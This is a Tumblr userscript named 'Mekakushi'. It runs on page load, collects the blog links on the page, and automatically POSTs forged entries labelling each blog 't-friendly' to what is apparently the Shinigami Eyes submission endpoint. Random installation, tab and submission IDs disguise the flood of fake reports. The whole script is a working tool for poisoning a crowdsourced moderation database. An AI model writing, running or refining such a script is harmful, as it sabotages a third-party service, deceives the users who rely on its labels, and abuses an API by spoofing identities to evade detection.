// ==UserScript==
// @name         Mekakushi
// @namespace    ConvertedInvader
// @version      1.0
// @description  BLIND THE EYES
// @author       ConvertedInvader
// @match        https://*.tumblr.com/*
// @grant        GM_xmlhttpRequest
// @inject-into  content
// ==/UserScript==

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function shuffleArray(array) {
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

function BLINDTHEEYES() {
	targets = [];
	marked = [];
	for (var i = 1; i < document.links.length; i++)
	{
		element = document.links[i];
		link = element.href.match(/(https:\/\/)(.+\.tumblr.com)/);

		if(link !== null && link[2] !== 'www.tumblr.com' && !marked.includes(link[0]))
		{
			mark = "";
			if(getRandomInt(1))
			{
				mark = "t-friendly";
			}
			else
			{
				mark = "transphobic";
			}

			targets.push({
				contextPage: "https://www.tumblr.com/dashboard",
				debug: undefined,
				frameId: 0,
				identifier: link[2],
				isSocialNetwork: true,
				linkId: (i+1),
				mark: "t-friendly",
				snippet: null,
				submissionId: (Math.random() + '').replace('.', ''),
				tabId: getRandomInt(10000),
				url: link[0],
				version: 100025
			});

			marked.push(link[0]);
		}
	};

	shuffleArray(targets);
	targets.unshift({
		identifier: ':MIGRATION',
		label: 100025
	});
  
  console.log(targets);

	requestBody = {
    installationId: (Math.random() + '.' + Math.random() + '.' + Math.random()).replace(/\./g, ''),
    lastError: null,
    entries: targets
  };
  
  GM_xmlhttpRequest({
    method: "POST",
    url: 'https://k5kk18774h.execute-api.us-east-1.amazonaws.com/default/shinigamiEyesSubmission',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
    data: JSON.stringify(requestBody),
    onload: function(response) {
      console.log("BLIND THE EYES");
    }
  });
}

window.onload = BLINDTHEEYES;